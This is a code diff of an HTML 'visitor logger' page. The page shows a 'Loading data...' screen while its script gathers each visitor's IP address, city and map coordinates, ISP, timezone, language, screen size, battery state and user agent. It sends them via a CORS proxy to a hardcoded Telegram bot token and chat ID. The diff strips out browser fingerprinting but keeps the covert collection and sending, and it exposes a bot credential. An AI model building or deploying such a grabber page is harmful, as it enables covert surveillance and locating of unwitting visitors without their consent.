@@ -2,13 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Visitor Logger</title>
-  <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
+  <title>Logger</title>
 </head>
 <body>
   <h1>Loading data...</h1>
   <script>
-    const TELEGRAM_BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k";
+    const BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k";
     const CHAT_ID = "7218964278";
 
     async function getIPInfo() {
@@ -20,72 +19,54 @@
       }
     }
 
-    async function getFingerprint() {
-      const fp = await FingerprintJS.load();
-      const result = await fp.get();
-      return result;
-    }
-
-    async function getBatteryInfo() {
+    async function getBattery() {
       if (navigator.getBattery) {
         const b = await navigator.getBattery();
-        return `Level: ${Math.round(b.level * 100)}%, Charging: ${b.charging}`;
+        return `Level: ${Math.round(b.level * 100)}% | Charging: ${b.charging}`;
       }
       return "Not supported";
     }
 
-    async function sendMessage(text) {
-      const proxy = "https://api.allorigins.win/raw?url=" + encodeURIComponent(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
-      );
+    async function sendTelegram(message) {
+      const proxyUrl = "https://api.allorigins.win/raw?url=" +
+        encodeURIComponent(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
 
-      await fetch(proxy, {
+      await fetch(proxyUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: CHAT_ID,
-          text: text,
+          text: message,
           parse_mode: "Markdown"
         })
       });
     }
 
     async function main() {
-      const ipInfo = await getIPInfo();
-      const battery = await getBatteryInfo();
-      const fp = await getFingerprint();
-      const nav = navigator;
-      const screen = window.screen;
+      const ip = await getIPInfo();
+      const battery = await getBattery();
 
-      const mapLink = ipInfo.latitude && ipInfo.longitude
-        ? `[📍 Open Map](https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude})`
-        : 'Location not available';
+      const mapLink = ip.latitude && ip.longitude
+        ? `[📍 View Map](https://www.google.com/maps?q=${ip.latitude},${ip.longitude})`
+        : 'Location unavailable';
 
       const msg = `
-📥 *New Visitor Detected*
+📡 *New Visitor Log*
 
-🕹 *IP:* ${ipInfo.ip || 'Unknown'}
-🌍 *Location:* ${ipInfo.city || 'N/A'}, ${ipInfo.region || 'N/A'}, ${ipInfo.country_name || 'N/A'}
-${mapLink}
+🌐 *IP:* ${ip.ip || "N/A"}
+📍 *Location:* ${ip.city || "?"}, ${ip.region || "?"}, ${ip.country_name || "?"}
+🗺️ ${mapLink}
+🏢 *ISP:* ${ip.org || "N/A"}
 
-🧭 *ISP:* ${ipInfo.org || 'N/A'}
-🕰 *Timezone:* ${ipInfo.timezone || 'N/A'}
-📅 *Date:* ${new Date().toLocaleString()}
-
-🖥 *User Agent:* ${nav.userAgent}
-🗣 *Language:* ${nav.language}
-📏 *Screen:* ${screen.width}x${screen.height}
+🧭 *Timezone:* ${ip.timezone || "N/A"}
+🗣 *Language:* ${navigator.language}
+📏 *Screen:* ${window.screen.width}x${window.screen.height}
 🔋 *Battery:* ${battery}
-
-🧬 *Fingerprint:* \`${fp.visitorId}\`
-🎨 *Canvas:* ${fp.components.canvas?.value || 'N/A'}
-🎧 *Audio:* ${fp.components.audio?.value || 'N/A'}
-🧩 *WebGL:* ${fp.components.webgl?.value?.vendor || 'N/A'} / ${fp.components.webgl?.value?.renderer || 'N/A'}
-🔠 *Fonts:* ${fp.components.fonts?.value?.join(", ") || 'N/A'}
+🧠 *User Agent:* ${navigator.userAgent}
       `.trim();
 
-      await sendMessage(msg);
-      document.body.innerHTML = "<h1>✅ Data berhasil dikirim ke Telegram!</h1>";
+      await sendTelegram(msg);
+      document.body.innerHTML = "<h2>✅ Data sent to Telegram!</h2>";
     }
 
     main();
